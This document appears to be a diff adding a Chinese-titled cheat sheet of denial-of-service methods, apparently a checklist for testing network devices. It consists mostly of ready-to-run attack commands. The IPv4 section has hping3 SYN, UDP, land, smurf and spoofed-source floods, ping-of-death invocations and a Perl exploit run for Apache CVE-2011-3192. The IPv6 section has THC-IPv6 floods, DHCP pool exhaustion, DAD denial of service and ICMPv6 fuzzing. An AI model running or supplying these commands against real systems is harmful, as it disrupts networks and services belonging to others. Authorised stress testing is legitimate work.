@@ -1,0 +1,245 @@
+============
+DoS 類型與方法
+============
+
+========== IPv4 ==========
+
+1.Ping of Death
+
+ping -f -s 65507 <ip4>
+ping -f -s 65537 <ip4>
+
+=====
+
+2.Teardrop attacks
+
+#using zarp
+cd zarp
+./zarp.py
+2 4
+1 <ip4>
+r
+
+=====
+
+3.Land attacks
+
+hping3 -V -c 1000000 -d 120 -S -w 64 -p 80 -s 80 --flood -a <ip4> <ip4>
+
+=====
+
+4.SYN flood
+
+hping3 -i u1 -S -p <port> <ip4> --rand-source
+
+=====
+
+5.SYN-ACK flood
+
+hping3 -SA <ip4> -p <port> -i u1 --rand-source
+
+=====
+
+6.Smurf flood
+*主要攻擊broadcast address, 無router功能不需做此測試
+
+hping3 -1 --flood -a <ip4> <ip4>.255
+BROADCAST_ADDRESS
+=====
+
+7.UDP flood
+
+hping3 --rand-source --udp <ip4> --flood
+
+=====
+
+8.ICMP flood (Reflectio) + IP spoofed
+
+ping -f -s 10000 <ip4>
+or
+hping3 --icmp --spoof <ip4> <ip4>.255 --flood
+ip4.255 = broadcast address
+=====
+
+9.Anomalies
+
+hping3 --rand-source -SAFRU -L 0 -M 0 -p <port> <ip4> --flood (w→w pass, no firewall log)
+or
+hping3 --rand-source -FR -L 0 -M 0 -p <port> <ip4> --flood
+
+=====
+
+10. Apache httpd Range header remote DoS ( CVE-2011-3192 )
+
+perl 17696.pl <ip4>
+
+
+========== IPv6 ==========
+
+ifconfig eth0 inet6 add 2001:1234:5678:9abc::105/64
+
+直接跟設備對接
+
+1. DAD DoS
+
+./dos-new-ip6 eth0
+
+This tools prevents new ipv6 eth0s to come up, by sending answers to
+duplicate ip6 checks (DAD). This results in a DOS for new ipv6 devices.
+
+=====
+
+2. Neighbor Advertisement Flood
+
+./flood_advertise6 eth0
+
+Flood the local network with neighbor advertisements.
+
+=====
+
+3. DHCP Client Flood
+
+./flood_dhcpc6 [-n|-N] [-1] [-d] eth0 [domain-name]
+
+./flood_dhcpc6 eth0 -N -d eth0
+
+DHCP client flooder. Use to deplete the IP address pool a DHCP6 server is
+offering. Note: if the pool is very large, this is rather senseless. :-)
+
+By default the link-local IP MAC address is random, however this won’t work
+in some circumstances. -n will use the real MAC, -N the real MAC and
+link-local address. -1 will only solicate an address but not request it.
+If -N is not used, you should run parasite6 in parallel.
+Use -d to force DNS updates, you can specify a domain name on the commandline.
+
+=====
+
+4. MLD Report Flood
+
+./flood_mld6 eth0
+
+Flood the local network with MLD reports.
+
+=====
+
+5. MLD Router Advertisement Flood
+
+./flood_mld26 eth0
+
+Flood the local network with MLDv2 reports.
+
+=====
+
+6. Router Advertisement Flood
+
+./flood_mldrouter6 eth0
+
+Flood the local network with MLD router advertisements.
+
+=====
+
+7. Neighbor Solicitation Flood
+
+./flood_solicitate6 eth0
+
+Flood the network with neighbor solicitations.
+
+=====
+
+8. ICMP Echo Request Fuzzing
+
+./fuzz_ip6 -I -F -S -D -H -R -J -1 eth0 <ip6>
+
+=====
+
+9. ICMP Neighbor Solicitation Fuzzing
+
+./fuzz_ip6 -I -R -2 eth0 <ip6>
+
+=====
+
+10. ICMP Neighbor Advertisement Fuzzing
+
+./fuzz_ip6 -I -R -3 eth0 <ip6>
+
+-3 fuzz ICMP6 neighbor advertisement
+=====
+
+11. ICMP Router Advertisement Fuzzing
+
+./fuzz_ip6 -I -R -4 eth0 <ip6>
+
+-4 fuzz ICMP6 router advertisement
+=====
+
+12. Multicast Listen Report Packet Fuzzing
+
+./fuzz_ip6 -I -H -R -5 eth0 <ip6>
+
+-5 fuzz multicast listener report packet
+=====
+
+13. Multicast Listen Done Packet Fuzzing
+
+./fuzz_ip6 -I -H -R -6 eth0 <ip6>
+
+-6 fuzz multicast listener done packet
+=====
+
+14. Multicast Listen Query Packet Fuzzing
+
+./fuzz_ip6 -I -H -R -7 eth0 <ip6>
+
+-7 fuzz multicast listener query packet
+=====
+
+15. Multicast Listen V2 Report Packet Fuzzing
+
+./fuzz_ip6 -I -H -R -8 eth0 <ip6>
+
+-8 fuzz multicast listener v2 report packet
+=====
+
+16. Multicast Listen V2 Query Packet Fuzzing
+
+./fuzz_ip6 -I -H -R -9 eth0 <ip6>
+
+-9 fuzz multicast listener v2 query packet
+=====
+
+17. Node Query Packet Fuzzing
+
+./fuzz_ip6 -I -R -0 eth0 <ip6>
+
+-0 fuzz node query packet
+=====
+
+18. ICMP error TooBig message Flood
+
+./ndpexhaust26 eth0 -acpPTUrR -s <sourceip6> <target_ipv6>
+
+ndpexhaust26 -PTUR -s 2001:1234:5678:9abc::107 eth0 2001:1234:5678:9abc::
+
+Options:
+-a add a hop-by-hop header with router alert
+-c do not calculate the checksum to save time
+-p send ICMPv6 Echo Requests
+-P send ICMPv6 Echo Reply
+-T send ICMPv6 Time-to-live-exeeded
+-U send ICMPv6 Unreachable (no route)
+-r randomize the source from your /64 prefix
+-R randomize the source fully
+-s sourceip6 use this as source ipv6 address
+
+Flood the target /64 network with ICMPv6 TooBig error messages.
+This tool version is manyfold more effective than ndpexhaust6.
+
+=====
+
+19. Smurf Flood
+
+./smurf6 eth0 <ip6>
+
+Smurf the target with icmp echo replies. Target of echo request is the
+local all-nodes multicast address if not specified
+
